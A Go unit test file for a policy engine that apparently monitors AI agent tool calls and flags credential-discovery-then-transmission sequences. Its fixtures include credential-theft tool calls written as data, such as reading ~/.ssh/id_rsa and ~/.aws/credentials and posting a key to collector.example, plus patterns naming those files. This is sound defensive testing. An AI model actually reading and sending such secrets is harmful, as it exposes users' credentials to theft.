package unit

import (
	"context"
	"testing"
	"time"

	"elida/internal/correlation"
	"elida/internal/policy"
)

func toolTaxonomyConfig() correlation.TaxonomyConfig {
	return correlation.TaxonomyConfig{ToolCategories: []correlation.ToolCategoryRule{
		{Category: "credential_discovery", Tools: []string{"read_file", "bash"}, ArgumentPatterns: []string{`\.aws/credentials`, `id_rsa`}},
		{Category: "external_transmission", Tools: []string{"http_*"}},
	}}
}

// toolCorrelatedEngine is a risk-ladder engine whose correlation block
// carries the test taxonomy and the given correlation rules.
func toolCorrelatedEngine(t *testing.T, rules []policy.Rule, corr ...correlation.Rule) *policy.Engine {
	t.Helper()
	if _, err := correlation.NewTaxonomy(toolTaxonomyConfig()); err != nil {
		t.Fatalf("NewTaxonomy: %v", err)
	}
	return policy.NewEngine(policy.Config{
		Enabled: true, Mode: "enforce", CaptureContent: true, MaxCaptureSize: 10000,
		Rules:      rules,
		RiskLadder: policy.RiskLadderConfig{Enabled: true, Thresholds: baselineThresholds()},
		Correlation: policy.CorrelationConfig{
			Enabled:  true,
			Rules:    corr,
			Limits:   correlation.Limits{MaxHistoryEvents: 64, MaxSessions: 64},
			Taxonomy: toolTaxonomyConfig(),
		},
	})
}

// flushTools waits until every queued tool-call batch has been categorized
// and observed: categorization runs off the request path.
func flushTools(t *testing.T, e *policy.Engine) {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	if err := e.FlushToolCalls(ctx); err != nil {
		t.Fatalf("FlushToolCalls: %v", err)
	}
}

func toolCorrelationStats(t *testing.T, e *policy.Engine) policy.CorrelationStats {
	t.Helper()
	st, ok := e.Stats()["correlation"].(policy.CorrelationStats)
	if !ok {
		t.Fatalf("no correlation stats: %+v", e.Stats())
	}
	return st
}

func findViolation(fs *policy.FlaggedSession, rule string) *policy.Violation {
	if fs == nil {
		return nil
	}
	for i := range fs.Violations {
		if fs.Violations[i].RuleName == rule {
			return &fs.Violations[i]
		}
	}
	return nil
}

// elevatedAt is one injection_elevated semantic decision at now+offset.
func elevatedAt(offset time.Duration) policy.Violation {
	return policy.Violation{
		RuleName: "injection_elevated", EventCategory: "injection_elevated",
		Severity: policy.SeverityInfo, Action: "flag", SourceRole: "user",
		Timestamp: time.Now().Add(offset), EvidenceOnly: true,
		Semantic: &policy.SemanticEvidence{DecisionID: "dec-elevated-1", Signal: "injection", Probability: 0.35},
	}
}

func credThenSend() correlation.Rule {
	return sequenceRule("cred_then_send", 10*time.Minute, "credential_discovery", "external_transmission")
}

func containsID(ids []string, id string) bool {
	for _, x := range ids {
		if x == id {
			return true
		}
	}
	return false
}

func TestCorrelationTools_CategorizedCallsAloneDoNotFlag(t *testing.T) {
	e := toolCorrelatedEngine(t, baselineRules(), credThenSend())
	res := e.EvaluateToolCalls("sess-t1", []policy.ToolCall{
		{ID: "call_1", Name: "read_file", Arguments: `{"path":"/home/u/.aws/credentials"}`},
	})
	if res != nil {
		t.Fatalf("categorization never produces a tool-rule result, got %+v", res)
	}
	flushTools(t, e)
	if e.IsFlagged("sess-t1") {
		t.Fatal("a categorized call that completes no match must not flag the session")
	}
	if st := toolCorrelationStats(t, e); st.EventsObserved != 1 {
		t.Fatalf("the call must reach correlation: %+v", st)
	}
}

func TestCorrelationTools_SequenceAcrossToolCalls(t *testing.T) {
	e := toolCorrelatedEngine(t, baselineRules(), credThenSend())
	e.EvaluateToolCalls("sess-t2", []policy.ToolCall{
		{ID: "call_1", Name: "read_file", Arguments: `{"path":"/home/u/.aws/credentials"}`},
	})
	e.EvaluateToolCalls("sess-t2", []policy.ToolCall{
		{ID: "call_2", Name: "http_post", Arguments: `{"url":"https://collector.example","body":"AKIA..."}`},
	})
	flushTools(t, e)
	fs := e.GetFlaggedSession("sess-t2")
	m := findViolation(fs, "correlation.cred_then_send")
	if m == nil {
		t.Fatalf("want a correlation.cred_then_send match, got %+v", fs)
	}
	if !m.EvidenceOnly || len(m.Correlation.EventIDs) != 2 {
		t.Fatalf("audit match with two contributing tool events: %+v", m)
	}
	for _, id := range m.Correlation.EventIDs {
		if len(id) < 3 || id[:3] != "te_" {
			t.Fatalf("tool events carry te_ IDs, got %q", id)
		}
	}
	for _, s := range []string{m.Description, m.MatchedText, m.SourceContent} {
		if contains(s, ".aws") || contains(s, "AKIA") || contains(s, "collector.example") {
			t.Fatalf("a match must carry no tool arguments: %q", s)
		}
	}
}

// Binding ruling (Task 4 note 2): a provider call ID is used only while it
// is unique within the session. The proxy evaluates each response once, so
// a repeated ID is a provider reusing IDs for distinct calls, and the repeat
// falls back to the anonymous form: two calls, two events. (The brief's
// draft asserted the opposite, "one call reported twice is one event",
// which the ruling reverses.)
func TestCorrelationTools_RepeatedCallIDFallsBackToAnonymous(t *testing.T) {
	e := toolCorrelatedEngine(t, baselineRules(),
		repeatedRule("cred_twice", "credential_discovery", 2, 10*time.Minute))
	call := policy.ToolCall{ID: "call_dup", Name: "bash", Arguments: "cat ~/.ssh/id_rsa"}
	e.EvaluateToolCalls("sess-t3", []policy.ToolCall{call})
	flushTools(t, e)
	if e.IsFlagged("sess-t3") {
		t.Fatal("one call is one event")
	}
	e.EvaluateToolCalls("sess-t3", []policy.ToolCall{call}) // the provider reused the ID
	flushTools(t, e)
	m := findViolation(e.GetFlaggedSession("sess-t3"), "correlation.cred_twice")
	if m == nil {
		t.Fatal("a repeated call ID is a distinct call and must count")
	}
	first := correlation.ToolEventID("sess-t3", "call_dup", "bash", "credential_discovery", time.Time{}, 0)
	if len(m.Correlation.EventIDs) != 2 || !containsID(m.Correlation.EventIDs, first) {
		t.Fatalf("want the first call under its provider ID and the repeat anonymous, got %v (first %s)", m.Correlation.EventIDs, first)
	}
}

func TestCorrelationTools_RepeatedCallIDInOneBatchIsTwoEvents(t *testing.T) {
	e := toolCorrelatedEngine(t, baselineRules(),
		repeatedRule("cred_twice", "credential_discovery", 2, 10*time.Minute))
	call := policy.ToolCall{ID: "call_same", Name: "bash", Arguments: "cat ~/.ssh/id_rsa"}
	e.EvaluateToolCalls("sess-t3b", []policy.ToolCall{call, call})
	flushTools(t, e)
	if findViolation(e.GetFlaggedSession("sess-t3b"), "correlation.cred_twice") == nil {
		t.Fatal("two calls sharing an ID in one response are two events")
	}
}

func TestCorrelationTools_DistinctCallIDsCount(t *testing.T) {
	e := toolCorrelatedEngine(t, baselineRules(),
		repeatedRule("cred_twice", "credential_discovery", 2, 10*time.Minute))
	e.EvaluateToolCalls("sess-t3c", []policy.ToolCall{{ID: "call_a", Name: "bash", Arguments: "cat ~/.ssh/id_rsa"}})
	e.EvaluateToolCalls("sess-t3c", []policy.ToolCall{{ID: "call_other", Name: "bash", Arguments: "cat ~/.ssh/id_rsa"}})
	flushTools(t, e)
	if findViolation(e.GetFlaggedSession("sess-t3c"), "correlation.cred_twice") == nil {
		t.Fatal("two distinct calls must match")
	}
}

func TestCorrelationTools_AnonymousCallsInOneBatchAreDistinct(t *testing.T) {
	e := toolCorrelatedEngine(t, baselineRules(),
		repeatedRule("cred_twice", "credential_discovery", 2, 10*time.Minute))
	e.EvaluateToolCalls("sess-t4", []policy.ToolCall{
		{Name: "bash", Arguments: "cat ~/.ssh/id_rsa"},
		{Name: "bash", Arguments: "cat ~/.ssh/id_rsa"},
	})
	flushTools(t, e)
	if findViolation(e.GetFlaggedSession("sess-t4"), "correlation.cred_twice") == nil {
		t.Fatal("two ID-less calls in one response are two events")
	}
}

// Anonymous calls in two batches are distinct too: the ordinal is the
// session's own counter, so equal timestamps cannot merge them.
func TestCorrelationTools_AnonymousCallsAcrossBatchesAreDistinct(t *testing.T) {
	e := toolCorrelatedEngine(t, baselineRules(),
		repeatedRule("cred_twice", "credential_discovery", 2, 10*time.Minute))
	for i := 0; i < 2; i++ {
		e.EvaluateToolCalls("sess-t4b", []policy.ToolCall{{Name: "bash", Arguments: "cat ~/.ssh/id_rsa"}})
	}
	flushTools(t, e)
	if findViolation(e.GetFlaggedSession("sess-t4b"), "correlation.cred_twice") == nil {
		t.Fatal("two ID-less calls in two responses are two events")
	}
}

func TestCorrelationTools_SemanticEvidenceThenTool(t *testing.T) {
	e := toolCorrelatedEngine(t, baselineRules(),
		sequenceRule("injected_then_send", 10*time.Minute, "injection_elevated", "external_transmission"))
	e.RecordSemanticViolation("sess-t5", elevatedAt(-time.Second))
	e.EvaluateToolCalls("sess-t5", []policy.ToolCall{{ID: "call_9", Name: "http_put", Arguments: `{}`}})
	flushTools(t, e)
	m := findViolation(e.GetFlaggedSession("sess-t5"), "correlation.injected_then_send")
	if m == nil {
		t.Fatal("a violation event and a tool event must correlate")
	}
	if m.Correlation.Categories[0] != "injection_elevated" || m.Correlation.Categories[1] != "external_transmission" {
		t.Fatalf("categories in order: %v", m.Correlation.Categories)
	}
}

func TestCorrelationTools_ToolRulesStillEnforce(t *testing.T) {
	rules := append(baselineRules(), policy.Rule{
		Name: "no_shell", Type: policy.RuleTypeToolBlocked, Patterns: []string{"bash"},
		Severity: policy.SeverityCritical, Action: "block",
	})
	e := toolCorrelatedEngine(t, rules, credThenSend())
	res := e.EvaluateToolCalls("sess-t6", []policy.ToolCall{{ID: "c", Name: "bash", Arguments: "cat ~/.aws/credentials"}})
	if res == nil || !res.ShouldBlock {
		t.Fatalf("a tool_blocked rule must still block with a taxonomy configured, got %+v", res)
	}
	flushTools(t, e)
}

// An enforce correlation rule fed by tool events is capped to evidence-only
// under policy.mode audit (D5), exactly like one fed by violations.
func TestCorrelationTools_EnforceRuleCappedUnderPolicyAudit(t *testing.T) {
	rule := credThenSend()
	rule.Mode = correlation.ModeEnforce
	rule.Severity = "critical"
	e := policy.NewEngine(policy.Config{
		Enabled: true, Mode: "audit",
		RiskLadder: policy.RiskLadderConfig{Enabled: true, Thresholds: baselineThresholds()},
		Correlation: policy.CorrelationConfig{
			Enabled: true, Limits: okLimits(), Rules: []correlation.Rule{rule},
			Taxonomy: toolTaxonomyConfig(),
		},
	})
	e.EvaluateToolCalls("sess-t9", []policy.ToolCall{{ID: "a", Name: "read_file", Arguments: "~/.aws/credentials"}})
	e.EvaluateToolCalls("sess-t9", []policy.ToolCall{{ID: "b", Name: "http_post"}})
	flushTools(t, e)
	fs := e.GetFlaggedSession("sess-t9")
	m := findViolation(fs, "correlation.cred_then_send")
	if m == nil || !m.EvidenceOnly || fs.RiskScore != 0 {
		t.Fatalf("enforce rule under policy audit must be evidence-only: %+v", fs)
	}
}

// A session that ends while its batch waits is not resurrected: history
// from before the session end never completes a match afterwards.
func TestCorrelationTools_SessionEndForgetsToolHistory(t *testing.T) {
	e := toolCorrelatedEngine(t, baselineRules(),
		repeatedRule("cred_twice", "credential_discovery", 2, 10*time.Minute))
	e.EvaluateToolCalls("sess-t7", []policy.ToolCall{{ID: "a", Name: "bash", Arguments: "id_rsa"}})
	flushTools(t, e)
	e.ReleaseFlaggedSession("sess-t7")
	e.EvaluateToolCalls("sess-t7", []policy.ToolCall{{ID: "b", Name: "bash", Arguments: "id_rsa"}})
	flushTools(t, e)
	if e.IsFlagged("sess-t7") {
		t.Fatal("history from before the session end must not complete a match afterwards")
	}
}

// Without a taxonomy nothing is queued: EvaluateToolCalls behaves exactly
// as before Plan B (the baseline pins the rest).
func TestCorrelationTools_NoTaxonomyQueuesNothing(t *testing.T) {
	e := policy.NewEngine(policy.Config{
		Enabled: true,
		Correlation: policy.CorrelationConfig{
			Enabled: true, Limits: okLimits(),
			Rules: []correlation.Rule{repeatedRule("cred_twice", "credential_discovery", 2, time.Minute)},
		},
	})
	e.EvaluateToolCalls("sess-t8", []policy.ToolCall{{ID: "a", Name: "bash", Arguments: "id_rsa"}})
	flushTools(t, e)
	if st := toolCorrelationStats(t, e); st.ToolBatchesQueued != 0 || st.EventsObserved != 0 {
		t.Fatalf("no taxonomy: nothing queued, got %+v", st)
	}
}

// The taxonomy is part of the restart-only correlation block: GetConfig
// returns it, and a reload with the same block keeps the engine (and its
// state).
func TestCorrelationTools_TaxonomyIsPartOfTheCorrelationBlock(t *testing.T) {
	e := toolCorrelatedEngine(t, baselineRules(),
		repeatedRule("cred_twice", "credential_discovery", 2, 10*time.Minute))
	e.EvaluateToolCalls("sess-t10", []policy.ToolCall{{ID: "a", Name: "bash", Arguments: "id_rsa"}})
	flushTools(t, e)
	cfg := e.GetConfig()
	if len(cfg.Correlation.Taxonomy.ToolCategories) != 2 {
		t.Fatalf("GetConfig lost the taxonomy: %+v", cfg.Correlation.Taxonomy)
	}
	e.ReloadConfig(cfg)
	e.EvaluateToolCalls("sess-t10", []policy.ToolCall{{ID: "b", Name: "bash", Arguments: "id_rsa"}})
	flushTools(t, e)
	if findViolation(e.GetFlaggedSession("sess-t10"), "correlation.cred_twice") == nil {
		t.Fatal("a no-op reload must keep correlation state across tool calls")
	}
}
